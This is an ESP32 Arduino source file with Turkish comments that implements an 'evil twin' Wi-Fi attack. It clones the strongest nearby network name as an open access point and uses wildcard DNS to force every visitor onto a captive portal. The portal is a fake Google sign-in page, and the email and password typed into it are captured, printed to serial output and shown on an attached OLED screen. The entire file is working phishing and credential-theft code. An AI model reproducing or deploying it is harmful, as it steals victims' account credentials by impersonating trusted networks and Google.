#include <Arduino.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <U8g2lib.h>
#include "eviltwin.h"
#include "neopixel.h"

extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;

const byte DNS_PORT = 53;
DNSServer dnsServer;
WebServer server(80);

char targetSSID[32] = "";
bool apRunning = false;
char lastEmail[64] = "";    // Son alınan email - boyut 32'den 64'e çıkarıldı
char lastPassword[64] = ""; // Son alınan şifre - boyut 32'den 64'e çıkarıldı

const char* captivePortalHTML = R"(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
        }
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: #f1f1f1;
        }
        .login-container {
            background-color: #fff;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        #logo {
            display: block;
            margin: 0 auto 20px;
        }
        h1, h2 {
            text-align: center;
            margin-bottom: 20px;
        }
        .g-input {
            display: block;
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        .gbtn-primary {
            display: block;
            width: 100%;
            padding: 10px;
            border: none;
            border-radius: 5px;
            background-color: #1a73e8;
            color: #fff;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <form action="/login" id="email-form-step" method="post">
            <div id="logo">
                <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                    <g id="qaEJec"><path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path></g>
                    <g id="YGlOvc"><path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path></g>
                    <g id="BWfIk"><path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path></g>
                    <g id="e6m3fd"><path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path></g>
                    <g id="vbkDmc"><path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path></g>
                    <g id="idEJde"><path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path></g>
                </svg>
            </div>
            <h1>Giris Yap</h1>
            <h2>Google Hesabinizi Kullanin</h2>
            <input name="email" type="text" class="g-input" placeholder="E-posta" required>
            <input name="password" type="password" class="g-input" placeholder="Sifre" required>
            <button class="gbtn-primary" type="submit">Sonraki</button>
        </form>
    </div>
</body>
</html>
)";

void handleRoot() {
  server.send(200, "text/html", captivePortalHTML);
}

void handleNotFound() {
  server.sendHeader("Location", "/", true);
  server.send(302, "text/plain", "");
}

void handleLogin() {
  if (server.hasArg("email") && server.hasArg("password")) {
    String email = server.arg("email");
    String password = server.arg("password");
    
    // Güvenli bir şekilde strncpy kullanımı
    strncpy(lastEmail, email.c_str(), sizeof(lastEmail) - 1);
    strncpy(lastPassword, password.c_str(), sizeof(lastPassword) - 1);
    
    // Null terminasyonunu garantile
    lastEmail[sizeof(lastEmail) - 1] = '\0';
    lastPassword[sizeof(lastPassword) - 1] = '\0';
    
    // Print to Serial Monitor
    Serial.printf("Captured: Email=%s, Password=%s\n", lastEmail, lastPassword);
    Serial.println("Credentials stored for OLED display");

    // Redirect user back to the login page with success message
    server.sendHeader("Location", "/");
    server.send(303);
  } else {
    handleRoot();
  }
}

void eviltwinSetup() {
  Serial.println("Starting Evil Twin...");
  u8g2.setFont(u8g2_font_6x10_tr);
  WiFi.mode(WIFI_AP_STA);
  WiFi.disconnect();
  delay(100);

  u8g2.clearBuffer();
  u8g2.drawStr(0, 10, "Scanning Wi-Fi...");
  u8g2.sendBuffer();

  int n = WiFi.scanNetworks(false, true);
  
  if (n <= 0) {
    strncpy(targetSSID, "FreeWiFi", sizeof(targetSSID) - 1);
    targetSSID[sizeof(targetSSID) - 1] = '\0';
    Serial.println("No networks found, using FreeWiFi");
  } else {
    char bestSSID[32] = "";
    int maxSignal = -100;
    
    for (int i = 0; i < n && i < 3; i++) {
      int rssi = WiFi.RSSI(i);
      if (rssi > maxSignal) {
        maxSignal = rssi;
        strncpy(bestSSID, WiFi.SSID(i).c_str(), sizeof(bestSSID) - 1);
        bestSSID[sizeof(bestSSID) - 1] = '\0';
      }
    }
    
    strncpy(targetSSID, bestSSID, sizeof(targetSSID) - 1);
    targetSSID[sizeof(targetSSID) - 1] = '\0';
    WiFi.scanDelete();
  }

  u8g2.clearBuffer();
  u8g2.drawStr(0, 10, "Target SSID:");
  u8g2.drawStr(0, 20, targetSSID);
  u8g2.sendBuffer();
  delay(1000);

  if (!WiFi.softAP(targetSSID, nullptr)) {
    Serial.println("SoftAP failed to start");
    u8g2.clearBuffer();
    u8g2.drawStr(0, 10, "AP Failed!");
    u8g2.sendBuffer();
    return;
  }

  WiFi.setTxPower(WIFI_POWER_8_5dBm);
  setNeoPixelColour("green");
  
  IPAddress apIP = WiFi.softAPIP();
  dnsServer.start(DNS_PORT, "*", apIP);
  
  server.on("/", handleRoot);
  server.on("/login", HTTP_POST, handleLogin);
  server.onNotFound(handleNotFound);
  server.begin();

  apRunning = true;
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_5x7_tr); // Daha küçük font
  u8g2.drawStr(0, 8, "Evil Twin AP Started");
  u8g2.drawStr(0, 16, targetSSID);
  char ipStr[16];
  snprintf(ipStr, 16, "%s", apIP.toString().c_str());
  u8g2.drawStr(0, 24, ipStr);
  u8g2.sendBuffer();
  Serial.printf("Evil Twin AP started: SSID=%s, IP=%s\n", targetSSID, ipStr);
}

void eviltwinLoop() {
  if (apRunning) {
    dnsServer.processNextRequest();
    server.handleClient();

    // OLED ekranını güncelle
    static unsigned long lastOLEDUpdate = 0;
    if (millis() - lastOLEDUpdate >= 1000) { // Ekranı her saniyede bir güncelle
      lastOLEDUpdate = millis();
      
      u8g2.clearBuffer();
      u8g2.setFont(u8g2_font_5x7_tr); // Daha küçük font
      u8g2.drawStr(0, 8, "Evil Twin AP Started");
      u8g2.drawStr(0, 16, targetSSID);
      char ipStr[16];
      snprintf(ipStr, 16, "%s", WiFi.softAPIP().toString().c_str());
      u8g2.drawStr(0, 24, ipStr);
      
      // Kimlik bilgileri varsa göster
      if (strlen(lastEmail) > 0) {
        u8g2.drawStr(0, 32, "Email:");
        // Kaydırma ekle
        static int emailScroll = 0;
        int emailLen = strlen(lastEmail);
        int maxDisplayChars = 14; // Ekranda gösterilecek maksimum karakter
        
        char displayEmail[15]; // Null terminasyonu için +1
        int endPos = emailScroll + maxDisplayChars;
        if (endPos > emailLen) endPos = emailLen;
        
        int count = 0;
        for (int i = emailScroll; i < endPos; i++) {
          displayEmail[count++] = lastEmail[i];
        }
        displayEmail[count] = '\0';
        
        u8g2.drawStr(30, 32, displayEmail);
        
        // Metni kaydır
        if (emailLen > maxDisplayChars) {
          emailScroll = (emailScroll + 1) % (emailLen - maxDisplayChars + 1);
        }
      }
      
      if (strlen(lastPassword) > 0) {
        u8g2.drawStr(0, 40, "Pass:");
        u8g2.drawStr(30, 40, lastPassword);
      }
      
      u8g2.sendBuffer();
    }
    
    // CPU yükünü azaltmak için küçük bir gecikme
    delay(10);
  }
}

void eviltwinCleanup() {
  Serial.println("Cleaning up Evil Twin...");
  if (apRunning) {
    server.stop();
    dnsServer.stop();
    WiFi.softAPdisconnect(true);
    apRunning = false;
    setNeoPixelColour("red");
    u8g2.clearBuffer();
    u8g2.drawStr(0, 10, "Evil Twin Stopped");
    u8g2.sendBuffer();
    Serial.println("Evil Twin stopped");
  }
  // Kimlik bilgilerini sıfırla
  memset(lastEmail, 0, sizeof(lastEmail));
  memset(lastPassword, 0, sizeof(lastPassword));
}